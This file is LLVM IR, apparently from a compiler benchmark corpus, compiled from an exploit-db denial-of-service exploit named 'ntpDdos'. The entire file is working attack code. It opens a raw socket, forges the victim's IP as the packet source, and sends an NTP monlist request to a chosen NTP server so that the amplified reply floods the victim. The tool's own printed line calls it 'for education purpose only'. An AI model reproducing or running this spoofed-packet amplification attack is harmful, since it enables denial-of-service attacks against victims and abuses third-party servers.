; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_33073.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_33073.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.iphdr = type { i32, i32, i32, i32, i64, i8*, i8*, i32, i64, i8*, i64 }
%struct.udpheader = type { i64, i8*, i8*, i8* }
%struct.ntpreqheader = type { i32, i32, i32 }
%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [46 x i8] c"Usage: ./ntpDdos [Target IP] [NTP Server IP]\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c"Example: ./ntpDdos 1.2.3.4 127.0.0.1 \0A\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"Watch it on wireshark!\0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"Coded for education purpose only!\0A\00", align 1
@PF_INET = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [34 x i8] c"Error on initializing the socket\0A\00", align 1
@IPPROTO_IP = common dso_local global i32 0, align 4
@IP_HDRINCL = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [47 x i8] c"Error on setting the option HDRINCL on socket\0A\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"123\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [28 x i8] c"Failed to send the packets\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca %struct.udpheader*, align 8
  %8 = alloca %struct.ntpreqheader*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 8
  %12 = alloca [116 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  store i32 1, i32* %10, align 4
  %13 = load i32, i32* %3, align 4
  %14 = icmp ne i32 %13, 3
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %19 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  %20 = call i32 @exit(i32 1) #3
  unreachable

21:                                               ; preds = %2
  %22 = load i32, i32* @PF_INET, align 4
  %23 = load i32, i32* @SOCK_RAW, align 4
  %24 = load i32, i32* @IPPROTO_UDP, align 4
  %25 = call i32 @socket(i32 %22, i32 %23, i32 %24)
  store i32 %25, i32* %9, align 4
  %26 = load i32, i32* %9, align 4
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %31

28:                                               ; preds = %21
  %29 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.4, i64 0, i64 0))
  %30 = call i32 @exit(i32 1) #3
  unreachable

31:                                               ; preds = %21
  %32 = load i32, i32* %9, align 4
  %33 = load i32, i32* @IPPROTO_IP, align 4
  %34 = load i32, i32* @IP_HDRINCL, align 4
  %35 = call i32 @setsockopt(i32 %32, i32 %33, i32 %34, i32* %10, i32 4)
  store i32 %35, i32* %5, align 4
  %36 = load i32, i32* %5, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %41

38:                                               ; preds = %31
  %39 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.5, i64 0, i64 0))
  %40 = call i32 @exit(i32 1) #3
  unreachable

41:                                               ; preds = %31
  %42 = getelementptr inbounds [116 x i8], [116 x i8]* %12, i64 0, i64 0
  %43 = call i32 @memset(i8* %42, i32 0, i32 116)
  %44 = getelementptr inbounds [116 x i8], [116 x i8]* %12, i64 0, i64 0
  %45 = bitcast i8* %44 to %struct.iphdr*
  store %struct.iphdr* %45, %struct.iphdr** %6, align 8
  %46 = getelementptr inbounds [116 x i8], [116 x i8]* %12, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 72
  %48 = bitcast i8* %47 to %struct.udpheader*
  store %struct.udpheader* %48, %struct.udpheader** %7, align 8
  %49 = getelementptr inbounds [116 x i8], [116 x i8]* %12, i64 0, i64 0
  %50 = getelementptr inbounds i8, i8* %49, i64 72
  %51 = getelementptr inbounds i8, i8* %50, i64 32
  %52 = bitcast i8* %51 to %struct.ntpreqheader*
  store %struct.ntpreqheader* %52, %struct.ntpreqheader** %8, align 8
  %53 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 0
  store i32 4, i32* %54, align 8
  %55 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 1
  store i32 5, i32* %56, align 4
  %57 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %58 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %57, i32 0, i32 10
  store i64 0, i64* %58, align 8
  %59 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 2
  store i32 116, i32* %60, align 8
  %61 = call i8* @htons(i32 1234)
  %62 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 9
  store i8* %61, i8** %63, align 8
  %64 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 8
  store i64 0, i64* %65, align 8
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 3
  store i32 255, i32* %67, align 4
  %68 = load i32, i32* @IPPROTO_UDP, align 4
  %69 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 7
  store i32 %68, i32* %70, align 8
  %71 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 4
  store i64 0, i64* %72, align 8
  %73 = load i8**, i8*** %4, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 1
  %75 = load i8*, i8** %74, align 8
  %76 = call i8* @inet_addr(i8* %75)
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 6
  store i8* %76, i8** %78, align 8
  %79 = load i8**, i8*** %4, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 2
  %81 = load i8*, i8** %80, align 8
  %82 = call i8* @inet_addr(i8* %81)
  %83 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %84 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %83, i32 0, i32 5
  store i8* %82, i8** %84, align 8
  %85 = call i32 @atoi(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %86 = call i8* @htons(i32 %85)
  %87 = load %struct.udpheader*, %struct.udpheader** %7, align 8
  %88 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %87, i32 0, i32 3
  store i8* %86, i8** %88, align 8
  %89 = call i32 @atoi(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %90 = call i8* @htons(i32 %89)
  %91 = load %struct.udpheader*, %struct.udpheader** %7, align 8
  %92 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %91, i32 0, i32 2
  store i8* %90, i8** %92, align 8
  %93 = call i8* @htons(i32 44)
  %94 = load %struct.udpheader*, %struct.udpheader** %7, align 8
  %95 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %94, i32 0, i32 1
  store i8* %93, i8** %95, align 8
  %96 = load %struct.udpheader*, %struct.udpheader** %7, align 8
  %97 = getelementptr inbounds %struct.udpheader, %struct.udpheader* %96, i32 0, i32 0
  store i64 0, i64* %97, align 8
  %98 = getelementptr inbounds [116 x i8], [116 x i8]* %12, i64 0, i64 0
  %99 = bitcast i8* %98 to i16*
  %100 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %101 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %100, i32 0, i32 2
  %102 = load i32, i32* %101, align 8
  %103 = call i64 @csum(i16* %99, i32 %102)
  %104 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %105 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %104, i32 0, i32 4
  store i64 %103, i64* %105, align 8
  %106 = load i32, i32* @AF_INET, align 4
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %106, i32* %107, align 8
  %108 = call i32 @atoi(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0))
  %109 = call i8* @htons(i32 %108)
  %110 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i8* %109, i8** %110, align 8
  %111 = load i8**, i8*** %4, align 8
  %112 = getelementptr inbounds i8*, i8** %111, i64 2
  %113 = load i8*, i8** %112, align 8
  %114 = call i8* @inet_addr(i8* %113)
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %116 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %115, i32 0, i32 0
  store i8* %114, i8** %116, align 8
  %117 = load %struct.ntpreqheader*, %struct.ntpreqheader** %8, align 8
  %118 = getelementptr inbounds %struct.ntpreqheader, %struct.ntpreqheader* %117, i32 0, i32 0
  store i32 23, i32* %118, align 4
  %119 = load %struct.ntpreqheader*, %struct.ntpreqheader** %8, align 8
  %120 = getelementptr inbounds %struct.ntpreqheader, %struct.ntpreqheader* %119, i32 0, i32 1
  store i32 3, i32* %120, align 4
  %121 = load %struct.ntpreqheader*, %struct.ntpreqheader** %8, align 8
  %122 = getelementptr inbounds %struct.ntpreqheader, %struct.ntpreqheader* %121, i32 0, i32 2
  store i32 42, i32* %122, align 4
  %123 = load i32, i32* %9, align 4
  %124 = getelementptr inbounds [116 x i8], [116 x i8]* %12, i64 0, i64 0
  %125 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 2
  %127 = load i32, i32* %126, align 8
  %128 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %129 = call i32 @sendto(i32 %123, i8* %124, i32 %127, i32 0, %struct.sockaddr* %128, i32 24)
  store i32 %129, i32* %5, align 4
  %130 = load i32, i32* %5, align 4
  %131 = icmp slt i32 %130, 0
  br i1 %131, label %132, label %135

132:                                              ; preds = %41
  %133 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.7, i64 0, i64 0))
  %134 = call i32 @exit(i32 1) #3
  unreachable

135:                                              ; preds = %41
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @setsockopt(i32, i32, i32, i32*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i8* @inet_addr(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @csum(i16*, i32) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
